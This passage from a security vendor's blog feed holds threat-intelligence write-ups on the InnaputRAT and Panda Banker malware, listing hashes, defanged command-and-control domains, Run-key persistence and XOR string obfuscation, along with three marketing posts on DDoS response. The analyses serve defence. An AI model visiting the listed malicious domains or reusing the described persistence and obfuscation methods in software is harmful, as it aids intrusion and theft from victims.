		<tr>
			<td style="text-align: left" width="228"><strong>Diaphora Function Match Stats</strong></td>
			<td width="396">Not done as this is the starting sample.</td>
		</tr>
	</tbody>
</table>

<p style="text-align: center"><small>Table 3: Sample 3 Analysis</small></p>

<p>The primary difference between Sample 2 and this sample is the file name used by the payload. &nbsp;The prior version used the name SafeApp.exe and installed the binary into %AppData% and added a Windows auto run registry entry against that file.&nbsp; Sample 3 does the same thing but makes the file name NeutralApp.exe. This is notable, because the malware checks for a copy of itself, and the name is static making it simple to identify infection. &nbsp;Due to the name change, the newer version runs even if SafeApp.exe is currently running on the victim machine. &nbsp;</p>

<h2>Sample 4 - January 22, 2018</h2>

<p>Continuing binary matching and infrastructure analysis, we found a fourth sample that showed more evolution of the binary by obfuscating some of the API names and strings. This binary also shared the same NeutralApp.exe file name and the same C2s as the prior variant. The “Command Options” also remained the same in this variant.</p>

<table class="aligncenter" width="624">
	<tbody>
		<tr>
			<td width="228"><strong>MD5</strong></td>
			<td width="396">4e61d5d9c2e0386a872232f8d33e76bc</td>
		</tr>
		<tr>
			<td width="228"><strong>Compile date</strong></td>
			<td width="396">2018-01-22 20:46:41</td>
		</tr>
		<tr>
			<td width="228"><strong>PDB</strong></td>
			<td width="396">D:\Arena\RobotNet\FileTransferStream\Release\FileTransfer.pdb</td>
		</tr>
		<tr>
			<td width="228"><strong>ITW</strong></td>
			<td width="396">hxxp://ico-investmen[.]com/1.exe</td>
		</tr>
		<tr>
			<td width="228"><strong>C2s:</strong></td>
			<td width="396">worlwidesupport[.]top ninjagames[.]top ajdhsfhiudsfhsi[.]top</td>
		</tr>
		<tr>
			<td width="228"><strong>Communication Port:</strong></td>
			<td width="396">52100</td>
		</tr>
		<tr>
			<td width="228"><strong>File Name:</strong></td>
			<td width="396">NeutralApp.exe</td>
		</tr>
		<tr>
			<td width="228"><strong>Persistence:</strong></td>
			<td width="396">HKU\&lt;SID&gt;\Software\Microsoft\Windows\CurrentVersion\Run: %appdata%\NeutralApp\NeutralApp.exe</td>
		</tr>
		<tr>
			<td width="228"><strong>Command Options</strong></td>
			<td width="396">Function Name: sub_401F95 No change</td>
		</tr>
		<tr>
			<td width="228"><strong>Diaphora Function Match Stats</strong></td>
			<td width="396">Matches: 33&nbsp; - sub_401F95 Unmatched: 13</td>
		</tr>
		<tr>
			<td width="228"><strong>Notes:</strong></td>
			<td width="396">Some API names and registry strings are obfuscated.</td>
		</tr>
	</tbody>
</table>

<p style="text-align: center"><small>Table 4: Sample 4 Analysis</small></p>

<p>The PDB string contained in this fourth sample is identical to Sample 2, further lending credence to the evolution of the InnaputRAT.</p>

<h3>API &amp; String Obfuscation</h3>

<p>This variant uses an 8-byte XOR key to obfuscate API names and other strings within the payload (Figure 5). <a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/xor_sample_4.png"><img alt="" class="wp-image-9583 size-medium" height="149" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/xor_sample_4-300x149.png" width="300" /></a> Figure 5: 8-Byte XOR Key for obfuscation</p>

<h2>Sample 5 - March 13, 2018</h2>

<p>The most recent variant of the InnaputRAT also shared the same C2s as the previous two samples, the same NeutralApp.exe name, and the same Registry Key creation. At the time of our analysis of this sample, the payload was being distributed by Godzilla Loader (Figure 6), a tool sold in underground forums and used in multiple campaigns to distribute malware such as Dridex, Trickbot, and Panda Banker.</p>

<table class="aligncenter" width="624">
	<tbody>
		<tr>
			<td width="228"><strong>MD5</strong></td>
			<td width="396">eec8e585ffdefb79a40ddb337ea852c6</td>
		</tr>
		<tr>
			<td width="228"><strong>Compile date</strong></td>
			<td width="396">2018-03-13 18:45:45</td>
		</tr>
		<tr>
			<td width="228"><strong>PDB</strong></td>
			<td width="396">N/A</td>
		</tr>
		<tr>
			<td width="228"><strong>ITW</strong></td>
			<td width="396">N/A</td>
		</tr>
		<tr>
			<td width="228"><strong>C2s:</strong></td>
			<td width="396">worlwidesupport[.]top ninjagames[.]top ajdhsfhiudsfhsi[.]top</td>
		</tr>
		<tr>
			<td width="228"><strong>Communication Port:</strong></td>
			<td width="396">52100</td>
		</tr>
		<tr>
			<td width="228"><strong>File Name:</strong></td>
			<td width="396">NeutralApp.exe</td>
		</tr>
		<tr>
			<td width="228"><strong>Persistence:</strong></td>
			<td width="396">HKU\&lt;SID&gt;\Software\Microsoft\Windows\CurrentVersion\Run: %appdata%\NeutralApp\NeutralApp.exe</td>
		</tr>
		<tr>
			<td width="228"><strong>Command Options</strong></td>
			<td width="396">Function Name: sub_401DA0 No change</td>
		</tr>
		<tr>
			<td width="228"><strong>Diaphora Function Match Stats</strong></td>
			<td width="396">Best Matches: 26&nbsp; - sub_401DA0 Unmatched: 27</td>
		</tr>
		<tr>
			<td width="228"><strong>Notes:</strong></td>
			<td width="396">More string and API Name obfuscation</td>
		</tr>
	</tbody>
</table>

<p style="text-align: center"><small>Table 5: Sample 5 Analysis</small></p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/godzilla-768x577.png"><img alt="" class="wp-image-9532 size-medium" height="225" src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/godzilla-768x577-300x225.png" width="300" /></a> Figure 6: GodZilla Loader Login Panel<br />
Primary differences between this sample and the previous two are diminishing matched functions using Diaphora (likely a result of the attackers obfuscating more API calls and strings) and a change in the 8-Byte XOR key used to obfuscate the API names and other strings. <a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/xor_sample_5.png"><img alt="" class="wp-image-9586 size-medium" height="152" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/xor_sample_5-300x152.png" width="300" /></a> Figure 7: 8-Byte XOR key change</p>

<h2>Summary</h2>

<p>ASERT believes the attackers behind the InnaputRAT are primarily targeting files for exfiltration from victim machines. The initial targeting of commercial manufacturing entities possibly suggests a goal of intellectual property theft. Since 2016 the malware has undergone significant changes. &nbsp;The attackers continue to improve the sophistication of the bot and its operation with the inclusion of an intermediary loader, Godzilla Loader, and obfuscation of key elements in the binary. We assess with moderate confidence that this operation will continue and the InnaputRAT will continue to evolve.</p>

<h2>Appendix&nbsp;A:</h2>

<h2>IOCs:</h2>

<ul>
	<li>alert-login-gmail[.]com</li>
	<li>blockhain[.]name</li>
	<li>best-online-tv[.]com</li>
	<li>dockooment[.]com</li>
	<li>docsautentification[.]com</li>
	<li>g000glemail[.]com</li>
	<li>googldraive[.]com</li>
	<li>googledockumets[.]com</li>
	<li>googledraive[.]com</li>
	<li>googlesuport[.]com</li>
	<li>googlmaile[.]com</li>
	<li>googlsupport[.]com</li>
	<li>govreportst[.]com</li>
	<li>iceerd[.]com</li>
	<li>login-googlemail[.]com</li>
	<li>mail-redirect.com[.]kz</li>
	<li>mfa-events[.]com</li>
	<li>msoficceupdate[.]com</li>
	<li>officemicroupdate[.]com</li>
	<li>officeonlaine[.]com</li>
	<li>osc-e[.]com</li>
	<li>pwdrecover[.]com</li>
	<li>suporteng[.]com</li>
	<li>un-booklet[.]com</li>
	<li>update-app[.]top</li>
	<li>usaid[.]info</li>
	<li>us-embassy-report[.]com</li>
	<li>worlwidesupport[.]top</li>
</ul>

<p>&nbsp; The activity described in this blog was derived from the ATLAS Intelligence Feed and original research by the ASERT Team. The indicators and signatures related to the activity enable Arbor APS to block the activity.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/default_images/blog_thumbnail_0.png" length="58011" type="image/png"/>
    <guid isPermaLink="false">3ada196d-bddc-4f6c-aaf2-a1d3ee6d705f</guid>
    <pubDate>Wed, 04 Apr 2018 16:02:23 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>The Six Phases of a DDoS Incident Response Plan</title>
  <link>http://localhost:7996/blog/six-phases-of-ddos-incident-response-plan</link>
  <description>Any enterprise that interacts with its customers and stakeholders online — which is just about everyone these days — needs to have robust defenses to detect and mitigate distributed denial of service (DDoS) attacks. It’s just as important, however, to have an equally robust incident response plan and process specific to DDoS. Otherwise, all your investment in defenses could...</description>
  <content:encoded><![CDATA[<p>Any enterprise that interacts with its customers and stakeholders online — which is just about everyone these days — needs to have robust defenses to detect and mitigate <a href="https://www.netscout.com/what-is-ddos">distributed denial of service (DDoS) attacks</a>. It’s just as important, however, to have an equally robust incident response plan and process specific to DDoS. Otherwise, all your investment in defenses could well be for naught.</p>

<h2>Learning About DDoS Incident Response The Hard Way</h2>

<p>An international online gaming company learned about DDoS incident response that lesson the hard way. The company in question had invested in a reputable DDoS managed services company, and considered itself well protected. Then one Sunday, when key people in the organization had the day off, a series of volumetric attacks targeted the site and took it down. Only a few senior employees were able to escalate incidents to the DDoS service provider, but unfortunately, they were not immediately available. When they were found, the internal teams and the service provider dialed into different conference lines, delaying response further, as a result, mitigation measures were not put into effect until it was too late, and the gaming service was down for more than 90 minutes. Online gamers demand high-quality, super-fast services. When they are offline completely, that is unacceptable. There are many gaming options available to choose from. At a minimum, the gaming company in this case lost $1 million in revenue. The damage to customer relationships, and the cost of promotions to keep them, are additional longer term consequences of a successful DDoS attack.</p>

<h2>What Can Go Wrong with DDoS Service Providers</h2>

<p>What went wrong? Having signed up for a reputable DDoS protection service, the small security staff at the gaming company felt like they were covered. What they didn’t fully appreciate, and their DDoS service provider didn’t explain, was that speed is a critical factor in incident response and successful mitigation.</p>

<p>The security team had never been trained; nor had they performed practice drills for such an eventuality. There was no transferrable process that did not depend on one or two individuals’ knowledge and authority.</p>

<p>Incident response is too often an afterthought in the case of DDoS attacks. So, what does an effective DDoS incident response program look like? It’s helpful to break it down into six phases that cover planning, preparation and practice, what to look for and how to deal with a DDoS attack, and what can be learned from an attack to further improve response the next time (knowing there will always be a next time). Note, too, that these phases are not linear, but rather a loop.</p>

<h3>PREPARATION</h3>

<ol>
</ol>

<p>This is likely the most difficult yet most important phase because it lays the foundation. Without adequate preparation, failure is virtually certain. The midst of an attack is no time to be trying to figure out your response.</p>

<p>First, build the team and assign responsibilities. Response to <a href="https://www.netscout.com/global-threat-intelligence">advanced threats</a> is often regarded as the responsibility of security operations teams, while DDoS defense typically falls to a network team, not the security team. Breaking down those silos is critical for communication during an attack. Establish upstream and downstream relationships and contact procedures — who is going to call whom, and why.</p>

<h3>IDENTIFICATION</h3>

<p>Without sufficient <a href="https://www.netscout.com/network-monitoring/application-performance-management">network visibility</a>, enterprises lack the information needed to understand whether poor service or <a href="https://www.netscout.com/network-monitoring/application-performance-management">application performance</a> is a result of DDoS attack traffic, or a network misconfiguration. On-premise solutions provide the critical traffic visibility needed to quickly diagnose the issue, saving IT and network teams valuable time while improving performance.</p>

<h3>CLASSIFICATION</h3>

<p>What kind of attack are you seeing? This tells you how you can expect it to proceed, and what kinds of countermeasures you need to employ.</p>

<h3>TRACEBACK</h3>

<p>Ascertain the origin of the attack — where is it coming from? Where and how is it affecting the network? This can help explain whether other network problems you are seeing are related to the attack.</p>

<h3>REACTION</h3>

<p>Having identified, classified and traced back the attack, you will be better prepared to implement the most appropriate mitigation tool. No one tool or technique is applicable in all circumstances. It pays to have a varied toolkit at hand, and to leverage automated response capabilities wherever possible.</p>

<h3>POST-MORTEM</h3>

<p>Analyze what happened. What can you learn? What can you do better? What is the one step everyone missed? How can you make the response faster, easier or less painful the next time? Anything concrete that comes of your findings, loop back to phase one and incorporate it into your preparation process.</p>

<h2>Strengthen DDoS Response Capabilities with a Best-Practice Defense</h2>

<p>The online gaming operator’s experience also underscores the need for a <a href="https://www.netscout.com/ddos-protection">hybrid detection and mitigation solution</a> that combines cloud-based and on-premise protection capabilities, which most security analysts now consider a <a href="https://www.netscout.com/what-is-ddos">DDoS mitigation</a> best practice. With a cloud-based service alone, it is often the customer’s responsibility to notify the MSSP when an attack has begun. On-premise DDoS solutions (appliance or virtual) provide network visibility and have a number of built-in countermeasures that kick in automatically when an attack is detected, without manual intervention, usually before you are even aware of the attack. This buys you valuable time to initiate and coordinate your DDoS incident response plan.</p>

<p>In the best-practice scenario, the on-premise and cloud defenses are integrated for seamless protection. Through advanced “cloud signaling,” the on-premise device alerts the cloud infrastructure to initiate mitigation when attack traffic reaches a specified capacity in your network.</p>

<p>Without question, automation gives you a critical advantage in incident response. But don’t rely on it entirely. You still need a solid incident response plan. Attackers employ sophisticated technology, for sure, but their real advantage is their cunning. Effective DDoS response calls for a similar combination of advanced technology and human intelligence to thwart devious behavior. And practice, practice, practice.</p>

<p>To learn more about NETSCOUT Arbor’s award-winning DDoS solutions, <a href="https://www.netscout.com/ddos-protection">click here</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Six%20Phases%201200x480.jpg" length="436455" type="image/jpeg"/>
    <guid isPermaLink="false">2cb81b9c-85a3-45fe-a3d2-081fdd3e476a</guid>
    <pubDate>Wed, 04 Apr 2018 13:29:56 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>Automation Puts Time on Your Side During a DDoS Attack</title>
  <link>http://localhost:7996/blog/ddos-attack-automation</link>
  <description>During a DDoS attack, time is unforgiving. A few seconds can mean the difference between a successful mitigation and costly network downtime. Anything that accelerates your mean time to detect (MTTD) and respond (MTTR) to an attack is to your advantage.</description>
  <content:encoded><![CDATA[<p>During a DDoS attack, time is unforgiving. A few seconds can mean the difference between a successful mitigation and costly network downtime. Anything that accelerates your mean time to detect (MTTD) and respond (MTTR) to an attack is to your advantage.</p>

<p>That’s especially true in today’s cloud and enterprise environments, where the combination of greater dependence on internet connectivity, distributed applications, and a wide range of evolving threats can overwhelm network and security operations teams. Security teams are under increasing pressure to make critical, on-the-fly judgements about which threats are real and which mitigation measures to deploy — all while the clock is ticking.</p>

<p>That makes automation a high priority in the selection of a DDoS defense solution. The right solution can buy you precious time by detecting attacks early and automatically deploying the appropriate countermeasures before the attacks impact network services. But automation must fundamentally block attacks while not blocking legitimate traffic, and it must inform the operator what was blocked and why. In other words, to be effective, it must lead users to the right answer, provide context and supporting analytics and, most importantly, be human-guided — not ‘black box.’</p>

<p><strong>NETSCOUT Arbor Networks DDoS Solutions Leverage Automation in Three Ways</strong></p>

<p><em>Built-In Countermeasures</em>&nbsp;– NETSCOUT Arbor Networks APS, our inline, always-on&nbsp;<a href="https://www.netscout.com/solutions/ddos-protection">DDoS mitigation solution</a>&nbsp;for enterprise and data center applications, incorporates more than 30 built-in automated countermeasures, each designed to detect and automatically engage on specific types of attacks based on our deep experience and knowledge of the attack landscape. When APS detects a particular attack, such as a TCP Syn flood, blacklisted hosts or multiple connection attempts from a single host, it will automatically enable/disable the right countermeasures to surgically mitigate those attacks without impacting legitimate traffic and provide detailed analytics and reporting on the events.</p>

<p>If an attack happens to be in progress when the APS is initially deployed, its countermeasures can still activate immediately because it doesn’t require learning times or baselining. Although these built-in countermeasures are designed to work effectively right out of the box, many can also be custom-configured to trigger based on the user’s specific security policies and risk thresholds.</p>

<p><em>Dynamic Threat Intelligence</em>&nbsp;– NETSCOUT Arbor’s Active Threat Level Analysis System (ATLAS) is the world’s most extensive threat intelligence gathering platform, delivering near real-time visibility into global Internet threat activity. More than simply collecting and analyzing data, the NETSCOUT Arbor Security Engineering and Response Team (ASERT) curates and operationalizes this threat intel into threat policies and countermeasure templates delivered via the ATLAS Intelligence Feed (AIF) directly into the Arbor APS and SP/TMS intelligent DDoS mitigation systems.</p>

<p>AIF contains a list of rules associated with different threat types, as well as risk levels (high, medium or low) associated with each type, and continually updates the NETSCOUT Arbor deployment as new threat policies, rules, etc. are developed. If APS, for example, detects suspicious traffic flows that match active threat policies, it will automatically block the traffic and indicate what it blocked and why in real-time reports.</p>

<p><em>Cloud Signaling</em>&nbsp;– Security experts are increasingly recommending a layered or hybrid DDoS protection strategy combining on-premises and cloud-based mitigation capabilities for maximum effectiveness. This gives the organization a scalable defense solution that can adapt to different types and sizes of attacks.&nbsp; NETSCOUT Arbor offers a comprehensive portfolio supporting this hybrid approach.</p>

<p>On-premise protections can immediately detect and mitigate the majority of smaller-scale, ‘low and slow’ attacks that typically target firewalls, IPS systems and network perimeter devices, whereas larger-scale volumetric attacks are best mitigated at the service provider level in the cloud. Effectively thwarting these multi-layer attacks requires the two defensive components to work in synchronization.</p>

<p>Cloud Signaling is NETSCOUT Arbor’s mechanism by which the on-premises component (Arbor APS) communicates in real-time with the service provider’s cloud component (SP/TMS, Arbor Cloud) to synchronize attack data and mitigation actions. If attack traffic volume at the premises escalates to a user-specified threshold, Cloud Signaling can automatically trigger the&nbsp;<a href="https://www.netscout.com/solutions/ddos-protection">cloud-based DDoS mitigation</a> countermeasure(s) and share attack data such as blocked IPs and misuse types. Security operators can also initiate Cloud Signaling manually when they see a growing threat. NETSCOUT Arbor’s hybrid solution gives network and security teams substantial flexibility to configure and fine-tune their Cloud Signaling policies.</p>

<p><strong>Intelligent Countermeasure Automation</strong></p>

<p>It’s all about speed of detection and mitigation. Automation can put you out in front of an attack and multiply the effectiveness of your security team – but only if it provides the right level of&nbsp;network visibility.</p>

<p>Many DDoS solutions on the market rely heavily, if not entirely, on “set and forget” automation that requires extensive baselining and learning yet in many cases still cannot distinguish between a genuine attack and a spike in legitimate traffic – and offer little to no attack analytics. The downside of this approach is threefold: triggering false positives, blocking valid customer sessions, and no visibility.</p>

<p>It’s important to select an intelligent DDoS mitigation solution that can rapidly and automatically distinguish actual attacks from traffic spikes and dynamically enable/disable the relevant countermeasures as the attack unfolds. It’s equally important to have the flexibility to update, reconfigure and refine automated response capabilities as the sophistication and techniques of DDoS attackers evolve and organizations learn more about the nature of attacks launched against them. NETSCOUT Arbor’s intelligent yet human-guided countermeasures, near real-time&nbsp;threat intel feeds&nbsp;and cloud signaling technologies are based on the industry’s most in-depth understanding of&nbsp;DDoS threats, both known and emerging. By capitalizing on these three pillars of DDoS best practices, enterprises and service providers can more effectively and expediently protect their networks than ever before.</p>

<p><a href="https://www.netscout.com/solutions/ddos-protection">Click here</a>&nbsp;to learn more about NETSCOUT Arbor’s DDoS solutions.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Automation%201200x480.jpg" length="386426" type="image/jpeg"/>
    <guid isPermaLink="false">09f6a87b-cda1-4e3b-8970-8fdd0f2402c8</guid>
    <pubDate>Mon, 02 Apr 2018 12:35:43 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Talbot Hack</dc:creator>
    </item>
<item>
  <title>DDoS Defense: The Need For Speed – Arbor Networks</title>
  <link>http://localhost:7996/blog/ddos-defense-need-speed-arbor-networks</link>
  <description>In DDoS defense, speed is critical. Unlike malware which can lie dormant within an organization for months, massive “fast flood” attacks can materialize in an instant and ramp up to hundreds of gigabits in a matter of seconds. Applications can appear to be working fine, and then suddenly become unavailable for no immediately apparent reason. By the time you even realize you’re...</description>
  <content:encoded><![CDATA[<p>In DDoS defense, speed is critical. Unlike malware which can lie dormant within an organization for months, massive “fast flood” attacks can materialize in an instant and ramp up to hundreds of gigabits in a matter of seconds. Applications can appear to be working fine, and then suddenly become unavailable for no immediately apparent reason. By the time you even realize you’re under attack, significant collateral damage may well have already taken place.</p>

<p><a href="https://www.arbornetworks.com/research/what-is-ddos" target="_blank">DDoS attacks</a> often strike multiple targets simultaneously, from bandwidth to applications to existing infrastructure, including network firewalls, web application firewalls (WAFs), and intrusion prevention systems (IPS). And attacks are becoming increasingly multi-vectored, employing a combination of attack methodologies and diversionary tactics to overwhelm defenses. The ability to defend your business and maintain availability of your services is directly dependent on how fast you are able to respond to these multi-pronged threats.</p>

<p><strong>Three Key Determinants of Speed </strong></p>

<p>So how can you trim precious seconds off your response time and put the odds in your favor? Focus on the three key determinants of speed:&nbsp;</p>

<ol>
	<li><strong>Detection </strong></li>
</ol>

<p>Speed of DDoS attack detection is the first and most fundamental capability required to initiate swift mitigation. The choice of solution here matters a great deal to your risk profile. Do you check the box and go with a newly added feature to your firewall, or do you opt for purpose built <a href="https://www.arbornetworks.com/research/what-is-ddos" target="_blank">DDoS protection</a>? What are the differences and why does it matter?</p>

<p>IPS devices, firewalls and other security products are essential elements of a layered-defense strategy, but they are designed to solve security problems that are fundamentally different from dedicated DDoS detection and mitigation products. IPS devices, for example, block break-in attempts that cause data theft. Meanwhile, firewalls act as policy enforcer to prevent unauthorized access to data. While such security products effectively address “network integrity and confidentiality,” they fail to address a fundamental concern regarding DDoS attacks — “network availability.”</p>

<p>The limitations in firewalls and IPS devices reveal the key benefits of an Intelligent DDoS Mitigation Solution (IDMS).</p>

<ul>
	<li>An IDMS is “stateless,” in other words, it does not track state for all connections. A stateful device, like a firewall or IPS, is vulnerable to DDoS and will only add to the problem.</li>
	<li>An IDMS solution does not depend on signatures created after the attack has been unleashed on the targets; rather, it supports multiple attack countermeasures. This enables about of the box protection against most attack types.</li>
	<li>The IDMS solution supports various deployment configurations; most importantly, it allows for out-of-band deployments when needed. This flexibility can increase the scalability of the solution, which is a requirement as the size of DDoS attacks continues to increase.</li>
	<li>To truly address “distributed” DoS attacks, an IDMS is a fully integrated solution that supports a distributed detection method. IPS devices leveraging single segment-based detection will miss major attacks.</li>
</ul>

<ol start="2">
	<li><strong>Intelligent Automation </strong></li>
</ol>

<p><a href="https://www.arbornetworks.com/blog/insight/automation-puts-time-side-ddos-attack/" target="_blank">Automation</a> is the holy grail in security these days. It helps with the staffing challenges and can be critical to speed of response. The good news is that it’s possible with the right IDMS to detect attacks and initiate mitigation automatically, often before security operators are aware of the attack. But being “automatic” and intelligently automated are two different things. IDMS solutions can intelligently incorporate dozens of built-in, automated countermeasures, each designed to target specific types of attacks.</p>

<p>In a hybrid DDoS defense deployment, which combines an on-premise with cloud-based mitigation protection, a more intelligent signal can be sent from an on-premise IDMS to activate cloud-based countermeasures. Here’s an example of what we mean by intelligent automation.</p>

<p>An on-premise IDMS is customized to protect specific applications running in a specific datacenter.&nbsp; This customization includes policies with specific white/black lists, geo-location information etc.&nbsp; These local, customized policies are continuously sent to a <a href="https://www.arbornetworks.com/ddos-protection-products/arbor-cloud" target="_blank">cloud-based DDoS protection service</a> — before an attack occurs — in other words during peace time. When an attack larger than the capacity of the on-premise protection occurs, a digital signal is sent to the cloud base DDoS protection. In which case, attack traffic is automatically rerouted to an appropriate cloud-based scrubbing center where previously sent customized protection policies, amongst others, are automatically applied to the attack traffic. This more intelligent method of attack traffic diversion and auto-mitigation using previously sent customized policies is an example of intelligent automation.</p>

<ol start="3">
	<li><strong>Response </strong></li>
</ol>

<p>Successfully dealing with DDoS attacks starts with having the right technology solutions in place, however, that is not the end of the story. At some point, even with multiple aspects of DDoS defense being automated, from pre-installed countermeasures to the connection with cloud-based mitigation, humans play a key role in the response and overall defense. Security teams need to be prepared to recognize and respond to threats without hesitation.&nbsp; Preparation is the key to develop the “organizational reflexes” to speed up incident response when under the pressure of an attack.</p>

<p><strong>Three Key DDoS Defense Questions</strong></p>

<ul>
	<li>Do you have a DDoS incident response plan?</li>
	<li>Do you know how to escalate across the organization, with network, applications and services teams who may be impacted by an attack?</li>
	<li>Do you have a communications plan for regulatory or compliance issues, customers, investors and partners?</li>
</ul>

<p>NETSCOUT Arbor’s decades of DDoS mitigation experience has proven to us that practice is essential to quick and effective incident response handling. Ignoring the critical human aspect of DDoS defense can be just as catastrophic to your business as choosing the wrong solution.</p>

<p>Intelligently automating the human response as much as possible will further decrease the time to mitigation and thus impact of a DDoS attack.</p>

<p>For more detailed information about NETSCOUT Arbor DDoS Attack Protection products and services, visit&nbsp;<a href="https://www.arbornetworks.com/ddos-protection-products">https://www.arbornetworks.com/ddos-protection-products</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Need%20for%20Speed%201200x480.jpg" length="532475" type="image/jpeg"/>
    <guid isPermaLink="false">ee3de96f-5c5a-4f51-b2b4-7d35e12567a7</guid>
    <pubDate>Thu, 29 Mar 2018 00:42:02 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Tom Bienkowski</dc:creator>
    </item>
<item>
  <title>Panda Banker Zeros in on Japanese Targets</title>
  <link>http://localhost:7996/blog/asert/panda-banker-zeros-japanese-targets</link>
  <description>Key Findings A threat actor using the well-known banking malware Panda Banker (a.k.a Zeus Panda, PandaBot) has started targeting financial institutions in Japan. Based on our data and analysis this is the first time that we have seen Panda Banker injects targeting Japanese organizations. It is likely a new campaign or actor started using Panda Banker since in addition to the...</description>
  <content:encoded><![CDATA[<h2>Key Findings</h2>

<ul>
	<li>A threat actor using the well-known banking malware Panda Banker (a.k.a Zeus Panda, PandaBot) has started targeting financial institutions in Japan.</li>
	<li>Based on our data and analysis this is the first time that we have seen Panda Banker injects targeting Japanese organizations.</li>
	<li>It is likely a new campaign or actor started using Panda Banker since in addition to the previously unseen Japanese targeting, Arbor has not seen any indicator of compromise (IOC) overlaps with previous Panda Banker campaigns.</li>
	<li>The sample used in this campaign was the first sample we observed in the wild to use the newest version of Panda Banker, version 2.6.6.</li>
</ul>

<h2>Overview</h2>

<p>Panda Banker is based on the Zeus malware family. One of its main functions is stealing user credentials, account numbers, and ultimately money from financial institutions. It does this by using a technique known as “<a href="https://attack.mitre.org/wiki/Technique/T1185">man in the browser</a>” along with “webinjects” that specify what websites to target and how. This banking malware was first seen in the wild in the beginning of 2016 (version 2.1.x) and has had consistent, incremental development since then. While some details have changed, our “<a href="https://www.arbornetworks.com/blog/asert/let-pandas-zeus-zeus-zeus-zeus/">Who Let the Pandas Out? Zeus, Zeus, Zeus, Zeus</a>” blog post is still a good introduction to the technical details of the malware. Panda Banker is sold as a kit on underground forums so there are multiple users of the malware. Cybercrime threat actors tend to focus their campaigns on particular countries—usually dependent on their ability to convert stolen credentials and account details from those locations into real money. Over the years we’ve seen Panda Banker campaigns focus on financial institutions in: Italy, Canada, Australia, Germany, United States, United Kingdom, and now Japan.</p>

<h2>Campaign Analysis</h2>

<p>A new version of Panda Banker, version 2.6.6, was observed being distributed in the wild on March 26th:</p>

<p><strong>SHA256:</strong> 8db8f6266f6ad9546b2b5386a835baa0cbf5ea5f699f2eb6285ddf401b76ccb7</p>

<p><strong>Compilation date:</strong> 2018-03-26 09:54:57 While we didn’t see any significant changes to the malware itself (possibly just a “bug fix” release), the campaign using this sample stood out for two reasons:</p>

<ol>
	<li>No IOC overlap with any previous Panda Banker campaigns that we’ve seen.</li>
	<li>Webinjects targeting Japan, a country we haven’t seen targeted by Panda Banker before.</li>
</ol>

<p><em>Command &amp; Control (C2)</em> The C2 servers configured for this sample are listed below:</p>

<ul>
	<li><a href="https://hillaryzell[.]xyz/1wekenauhivwauvaxquor.dat">https://hillaryzell[.]xyz/1wekenauhivwauvaxquor.dat</a></li>
	<li>https://buscamapa1[.]top/2yrfuupcovylaawubitvy.dat</li>
	<li>https://buscamapa2[.]top/3toaxkatoindyepidikuv.dat</li>
	<li>https://buscamapa3[.]top/4heequktuepahvoyfofit.dat</li>
	<li>https://buscamapa4[.]top/5ufyfegtuobekpykobeul.dat</li>
	<li>https://buscamapa5[.]top/6lubanuoxapywinlaokow.dat</li>
</ul>

<p>At the time of research, only hillaryzell[.]xyz was operational and it was registered to a “Petrov Vadim” using an email address of “<a href="mailto:yalapinziw@mail.ru">yalapinziw@mail.ru</a>”. <em>Campaign Name</em> The threat actor named this campaign “ank”. <em>Webinjects</em> At the time of research, the C2 server returned 27 webinjects that can be broken down into the following categories:</p>

<ul>
	<li>17 Japanese banking web sites mostly focusing on credit cards</li>
	<li>1 US based web email site</li>
	<li>1 US based video search engine</li>
	<li>4 US based search engines</li>
	<li>1 US based online shopping site</li>
	<li>2 US based social media sites</li>
	<li>1 US based adult content hub</li>
</ul>

<p>An example, redacted webinject for this campaign looks like the following: [caption id="attachment_9530" align="aligncenter" width="700"]<a href="https://www.arbornetworks.com/blog/asert/panda-banker-zeros-in-on-japanese-targets/webinject/" rel="attachment wp-att-9530"><img alt="" class="wp-image-9530" height="411" src="//www.arbornetworks.com/blog/asert/wp-content/uploads/2018/03/webinject.png" width="700" /></a> Example webinject targeting Japan.[/caption] The webinjects in this campaign make use of a “grabber” / automated transfer system (ATS) system known as “<a href="http://www.xylibox.com/2014/05/atsengine.html">Full Info Grabber</a>” to capture credentials and account information. As can be seen in figures above, the threat actor is using a path of “jpccgrab” possibly meaning “Japanese credit card grabber”. Given the targeting, this name makes some sense. <em>Distribution (update March 28, 2018)</em> Security researcher&nbsp;kafeine has <a href="https://twitter.com/kafeine/status/978900624204025857">released</a> more details on how this threat is being distributed in the wild: a malicious advertisement (malvertising) is redirecting victims to a RIG exploit kit which is distributing the Panda Banker malware.</p>

<h2>Conclusion</h2>

<p>Japan is no stranger to banking malware. Based on recent reports, the country has been plagued by attacks using the <a href="https://securityintelligence.com/ursnif-campaign-waves-breaking-on-japanese-shores/">Ursnif</a>&nbsp;and <a href="https://www.fireeye.com/blog/threat-research/2016/01/urlzone_zones_inon.html">Urlzone</a>&nbsp;banking malware. This post was our first analysis of the first Panda Banker campaign that we’ve seen to target financial institutions in Japan.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/PandaBanker.png" length="145566" type="image/png"/>
    <guid isPermaLink="false">05b33cb4-b8d0-44ae-944e-1a3ea2440e7c</guid>
